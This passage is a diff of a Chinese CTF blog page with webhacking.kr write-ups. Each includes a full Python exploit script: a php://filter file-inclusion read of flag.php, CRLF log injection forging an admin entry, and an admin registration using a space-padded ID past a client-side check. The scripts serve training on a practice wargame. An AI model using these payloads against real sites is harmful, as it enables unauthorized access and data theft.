@@ -234,7 +234,7 @@ p.spoiler {
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">539</span>
+          <span class="site-state-item-count">540</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -245,7 +245,7 @@ p.spoiler {
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">355</span>
+        <span class="site-state-item-count">357</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -279,7 +279,7 @@ p.spoiler {
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/webhacking/old-38/">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/webhacking/old-25/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.png">
@@ -297,7 +297,7 @@ p.spoiler {
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/webhacking/old-38/" class="post-title-link" itemprop="url">Webhacking.kr old-38</a>
+          <a href="/wp/webhacking/old-25/" class="post-title-link" itemprop="url">Webhacking.kr old-25</a>
         </h2>
 
         <div class="post-meta-container">
@@ -327,7 +327,7 @@ p.spoiler {
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">Word count in article: </span>
-      <span>288</span>
+      <span>280</span>
     </span>
     <span class="post-meta-item" title="Reading time">
       <span class="post-meta-item-icon">
@@ -347,25 +347,24 @@ p.spoiler {
     <div class="post-body" itemprop="articleBody">
           <h3 id="challenge">Challenge</h3>
 <blockquote>
-<p>Inject an admin log entry through the login form.</p>
-<p>通过登录表单注入 admin 日志记录。</p>
+<p>Read the flag source through the file parameter.</p>
+<p>通过 file 参数读取 flag 源码。</p>
 </blockquote>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://webhacking.kr/challenge/bonus-9/</span><br></pre></td></tr></table></figure>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://webhacking.kr:10001/</span><br></pre></td></tr></table></figure>
 <h3 id="analysis">Analysis</h3>
-<p>页面源码注释暴露了 <code>admin.php</code>。提交 <code>id</code>
-后，日志查看器会记录客户端地址和输入值，并要求日志行中的身份为
-<code>admin</code>。表单输入不能直接携带换行，但 POST body 可以传递 CRLF
-序列。将 CRLF 写入 <code>id</code>
-后，日志解析器会把后续内容视为新行。</p>
+<p><code>file</code> 参数进入 PHP 的文件包含路径，服务端会在资源名后补上
+<code>.php</code>。直接包含 <code>flag</code> 会执行其中的
+PHP；把路径改成
+<code>php://filter/convert.base64-encode/resource=flag</code> 后，PHP
+先读取 <code>flag.php</code>，再将源码编码为
+Base64，源码内容不会被执行。</p>
 <h3 id="solution">Solution</h3>
-<p>以下完整脚本在 <code>id</code> 中插入 CRLF，并随后读取题目提供的
-<code>admin.php</code>：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;Test the old-38 CRLF log payload&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;--client-ip&quot;</span>, required=<span class="literal">True</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;--base&quot;</span>, default=<span class="string">&quot;https://webhacking.kr&quot;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    session = requests.Session()</span><br><span class="line">    login_url = args.base.rstrip(<span class="string">&quot;/&quot;</span>) + <span class="string">&quot;/challenge/bonus-9/&quot;</span></span><br><span class="line">    admin_url = login_url + <span class="string">&quot;admin.php&quot;</span></span><br><span class="line">    forged_line = <span class="string">f&quot;guest\r\n<span class="subst">&#123;args.client_ip&#125;</span>:admin&quot;</span></span><br><span class="line"></span><br><span class="line">    response = session.post(login_url, data=&#123;<span class="string">&quot;id&quot;</span>: forged_line&#125;, timeout=<span class="number">20</span>)</span><br><span class="line">    response.raise_for_status()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;login: <span class="subst">&#123;response.status_code&#125;</span> <span class="subst">&#123;<span class="built_in">len</span>(response.content)&#125;</span> bytes&quot;</span>)</span><br><span class="line"></span><br><span class="line">    admin_response = session.get(admin_url, timeout=<span class="number">20</span>)</span><br><span class="line">    admin_response.raise_for_status()</span><br><span class="line">    <span class="built_in">print</span>(admin_response.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
-<p>原始 payload 的字面结构为：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">guest\r\n&lt;client-ip&gt;:admin</span><br></pre></td></tr></table></figure>
-<p><code>&lt;client-ip&gt;</code>
-必须替换为当前题目页面显示的客户端地址，不能使用任意地址。<code>admin.php</code>
-应在日志地址与当前客户端地址匹配时返回题目结果。</p>
+<p>完整请求脚本如下。它从响应中提取 Base64
+字符串并尝试解码，直到找到包含 PHP flag 变量的源码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&quot;http://webhacking.kr:10017/&quot;</span></span><br><span class="line">FILTER_PATH = <span class="string">&quot;php://filter/convert.base64-encode/resource=flag&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_source</span>(<span class="params">response_text: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    candidates = re.findall(<span class="string">r&quot;[A-Za-z0-9+/]&#123;20,&#125;=&#123;0,2&#125;&quot;</span>, response_text)</span><br><span class="line">    <span class="keyword">for</span> token <span class="keyword">in</span> candidates:</span><br><span class="line">        padded = token + <span class="string">&quot;=&quot;</span> * (-<span class="built_in">len</span>(token) % <span class="number">4</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            decoded = base64.b64decode(padded, validate=<span class="literal">True</span>).decode(</span><br><span class="line">                <span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;replace&quot;</span></span><br><span class="line">            )</span><br><span class="line">        <span class="keyword">except</span> (ValueError, UnicodeError):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$flag&quot;</span> <span class="keyword">in</span> decoded <span class="keyword">or</span> <span class="string">&quot;FLAG&#123;&quot;</span> <span class="keyword">in</span> decoded:</span><br><span class="line">            <span class="keyword">return</span> decoded</span><br><span class="line">    <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;response did not contain decodable flag source&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    response = requests.get(</span><br><span class="line">        URL,</span><br><span class="line">        params=&#123;<span class="string">&quot;file&quot;</span>: FILTER_PATH&#125;,</span><br><span class="line">        timeout=<span class="number">20</span>,</span><br><span class="line">    )</span><br><span class="line">    response.raise_for_status()</span><br><span class="line">    <span class="built_in">print</span>(decode_source(response.text))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<p>从响应中读取并解码 <code>flag.php</code> 源码后，将其中的 flag
+填入认证表单。</p>
+<p>服务端响应模板变化时，应先从响应中定位实际 Base64 内容。</p>
 
       
     </div>
@@ -520,6 +519,119 @@ MD5，需要在当前秒提交。</li>
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/webhacking/old-38/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/webhacking/old-38/" class="post-title-link" itemprop="url">Webhacking.kr old-38</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-09-26 13:03:55" itemprop="dateCreated datePublished" datetime="2026-09-26T13:03:55+08:00">2026-09-26</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="Word count in article">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">Word count in article: </span>
+      <span>288</span>
+    </span>
+    <span class="post-meta-item" title="Reading time">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>1 mins.</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>Inject an admin log entry through the login form.</p>
+<p>通过登录表单注入 admin 日志记录。</p>
+</blockquote>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://webhacking.kr/challenge/bonus-9/</span><br></pre></td></tr></table></figure>
+<h3 id="analysis">Analysis</h3>
+<p>页面源码注释暴露了 <code>admin.php</code>。提交 <code>id</code>
+后，日志查看器会记录客户端地址和输入值，并要求日志行中的身份为
+<code>admin</code>。表单输入不能直接携带换行，但 POST body 可以传递 CRLF
+序列。将 CRLF 写入 <code>id</code>
+后，日志解析器会把后续内容视为新行。</p>
+<h3 id="solution">Solution</h3>
+<p>以下完整脚本在 <code>id</code> 中插入 CRLF，并随后读取题目提供的
+<code>admin.php</code>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="literal">None</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;Test the old-38 CRLF log payload&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;--client-ip&quot;</span>, required=<span class="literal">True</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;--base&quot;</span>, default=<span class="string">&quot;https://webhacking.kr&quot;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    session = requests.Session()</span><br><span class="line">    login_url = args.base.rstrip(<span class="string">&quot;/&quot;</span>) + <span class="string">&quot;/challenge/bonus-9/&quot;</span></span><br><span class="line">    admin_url = login_url + <span class="string">&quot;admin.php&quot;</span></span><br><span class="line">    forged_line = <span class="string">f&quot;guest\r\n<span class="subst">&#123;args.client_ip&#125;</span>:admin&quot;</span></span><br><span class="line"></span><br><span class="line">    response = session.post(login_url, data=&#123;<span class="string">&quot;id&quot;</span>: forged_line&#125;, timeout=<span class="number">20</span>)</span><br><span class="line">    response.raise_for_status()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;login: <span class="subst">&#123;response.status_code&#125;</span> <span class="subst">&#123;<span class="built_in">len</span>(response.content)&#125;</span> bytes&quot;</span>)</span><br><span class="line"></span><br><span class="line">    admin_response = session.get(admin_url, timeout=<span class="number">20</span>)</span><br><span class="line">    admin_response.raise_for_status()</span><br><span class="line">    <span class="built_in">print</span>(admin_response.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<p>原始 payload 的字面结构为：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">guest\r\n&lt;client-ip&gt;:admin</span><br></pre></td></tr></table></figure>
+<p><code>&lt;client-ip&gt;</code>
+必须替换为当前题目页面显示的客户端地址，不能使用任意地址。<code>admin.php</code>
+应在日志地址与当前客户端地址匹配时返回题目结果。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/webhacking/better-than-xml/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -608,123 +720,6 @@ MySQL JSON 文档保留重复 key，后续
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /challenge/new-17/?page=join_</span><br><span class="line">Content-Type: application/json</span><br></pre></td></tr></table></figure>
 <p>随后使用相同 userid/userpw 登录：</p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /challenge/new-17/?page=login_</span><br><span class="line">uid=hermesx</span><br><span class="line">upw=hermesy</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/webhacking/old-05/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/webhacking/old-05/" class="post-title-link" itemprop="url">Webhacking.kr old-05</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2026-09-26 12:55:47" itemprop="dateCreated datePublished" datetime="2026-09-26T12:55:47+08:00">2026-09-26</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-    <span class="post-meta-break"></span>
-    <span class="post-meta-item" title="Word count in article">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">Word count in article: </span>
-      <span>390</span>
-    </span>
-    <span class="post-meta-item" title="Reading time">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">Reading time &asymp;</span>
-      <span>1 mins.</span>
-    </span>
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h3 id="challenge">Challenge</h3>
-<blockquote>
-<p>Bypass the JavaScript-only access check and create the admin
-user.</p>
-<p>绕过只存在于 JavaScript 中的访问控制，并创建 admin 用户。</p>
-</blockquote>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://webhacking.kr/challenge/web-05/</span><br></pre></td></tr></table></figure>
-<h3 id="analysis">Analysis</h3>
-<p><code>join.php</code> 的表单由混淆 JavaScript 动态生成。脚本只在
-Cookie 中出现 <code>oldzombie</code> 且 URL 包含 <code>mode=1</code>
-时显示表单，这两个条件都在客户端执行，因此可以直接构造请求访问注册接口。</p>
-<p>注册接口拒绝精确的 <code>admin</code>。可将 <code>id</code> 设为 20
-个空格后接 <code>admin</code>，注册后再用 <code>admin</code>
-登录；该边界行为依赖目标部署的字段截断与比较规则。</p>
-<h3 id="solution">Solution</h3>
-<p>下面的脚本用同一个 session 完成注册和登录。<code>REGISTER_ID</code>
-中的 20 个空格必须保留；直接在浏览器表单输入可能被
-<code>maxlength</code> 截断，所以脚本直接发送 POST body。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">BASE_URL = os.environ.get(</span><br><span class="line">    <span class="string">&quot;OLD05_URL&quot;</span>, <span class="string">&quot;https://webhacking.kr/challenge/web-05&quot;</span></span><br><span class="line">)</span><br><span class="line">JOIN_URL = <span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/mem/join.php?mode=1&quot;</span></span><br><span class="line">LOGIN_URL = <span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/mem/login.php&quot;</span></span><br><span class="line">COOKIE_NAME = <span class="string">&quot;oldzombie&quot;</span></span><br><span class="line">REGISTER_ID = (<span class="string">&quot; &quot;</span> * <span class="number">20</span>) + <span class="string">&quot;admin&quot;</span></span><br><span class="line">LOGIN_ID = <span class="string">&quot;admin&quot;</span></span><br><span class="line">PASSWORD = <span class="string">&quot;1234&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">with</span> requests.Session() <span class="keyword">as</span> session:</span><br><span class="line">        session.cookies.<span class="built_in">set</span>(COOKIE_NAME, <span class="string">&quot;hello&quot;</span>)</span><br><span class="line">        register = session.post(</span><br><span class="line">            JOIN_URL,</span><br><span class="line">            data=&#123;<span class="string">&quot;id&quot;</span>: REGISTER_ID, <span class="string">&quot;pw&quot;</span>: PASSWORD&#125;,</span><br><span class="line">            timeout=<span class="number">10</span>,</span><br><span class="line">        )</span><br><span class="line">        register.raise_for_status()</span><br><span class="line">        <span class="built_in">print</span>(register.text)</span><br><span class="line"></span><br><span class="line">        login = session.post(</span><br><span class="line">            LOGIN_URL,</span><br><span class="line">            data=&#123;<span class="string">&quot;id&quot;</span>: LOGIN_ID, <span class="string">&quot;pw&quot;</span>: PASSWORD&#125;,</span><br><span class="line">            timeout=<span class="number">10</span>,</span><br><span class="line">        )</span><br><span class="line">        login.raise_for_status()</span><br><span class="line">        <span class="built_in">print</span>(login.text)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    sys.exit(main())</span><br></pre></td></tr></table></figure>
-<p>如果客户端或代理会裁剪前导空格，应确认原始 form body 仍包含 20
-个空格后再发送。<code>mode=1</code>
-只用于打开注册页面，<code>oldzombie=hello</code> 只用于通过 JavaScript
-检查。</p>
-<p>注册字段的前导空格数量取决于题目部署的字段长度与比较规则；复现时以目标响应确认服务端是否保留
-20 个空格。</p>
 
       
     </div>
@@ -844,6 +839,123 @@ injection。下面的脚本包含两个请求和所有字段：</p>
 <p><code>--</code> 后面的空格是 payload
 的一部分，用于注释查询剩余内容。<code>answer</code> 必须作为 POST
 字段发送，不能只把它放在初始 Nonogram 的 GET 参数中。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/webhacking/old-05/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/webhacking/old-05/" class="post-title-link" itemprop="url">Webhacking.kr old-05</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-09-26 12:55:47" itemprop="dateCreated datePublished" datetime="2026-09-26T12:55:47+08:00">2026-09-26</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="Word count in article">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">Word count in article: </span>
+      <span>390</span>
+    </span>
+    <span class="post-meta-item" title="Reading time">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>1 mins.</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>Bypass the JavaScript-only access check and create the admin
+user.</p>
+<p>绕过只存在于 JavaScript 中的访问控制，并创建 admin 用户。</p>
+</blockquote>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://webhacking.kr/challenge/web-05/</span><br></pre></td></tr></table></figure>
+<h3 id="analysis">Analysis</h3>
+<p><code>join.php</code> 的表单由混淆 JavaScript 动态生成。脚本只在
+Cookie 中出现 <code>oldzombie</code> 且 URL 包含 <code>mode=1</code>
+时显示表单，这两个条件都在客户端执行，因此可以直接构造请求访问注册接口。</p>
+<p>注册接口拒绝精确的 <code>admin</code>。可将 <code>id</code> 设为 20
+个空格后接 <code>admin</code>，注册后再用 <code>admin</code>
+登录；该边界行为依赖目标部署的字段截断与比较规则。</p>
+<h3 id="solution">Solution</h3>
+<p>下面的脚本用同一个 session 完成注册和登录。<code>REGISTER_ID</code>
+中的 20 个空格必须保留；直接在浏览器表单输入可能被
+<code>maxlength</code> 截断，所以脚本直接发送 POST body。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">BASE_URL = os.environ.get(</span><br><span class="line">    <span class="string">&quot;OLD05_URL&quot;</span>, <span class="string">&quot;https://webhacking.kr/challenge/web-05&quot;</span></span><br><span class="line">)</span><br><span class="line">JOIN_URL = <span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/mem/join.php?mode=1&quot;</span></span><br><span class="line">LOGIN_URL = <span class="string">f&quot;<span class="subst">&#123;BASE_URL&#125;</span>/mem/login.php&quot;</span></span><br><span class="line">COOKIE_NAME = <span class="string">&quot;oldzombie&quot;</span></span><br><span class="line">REGISTER_ID = (<span class="string">&quot; &quot;</span> * <span class="number">20</span>) + <span class="string">&quot;admin&quot;</span></span><br><span class="line">LOGIN_ID = <span class="string">&quot;admin&quot;</span></span><br><span class="line">PASSWORD = <span class="string">&quot;1234&quot;</span></span><br><span 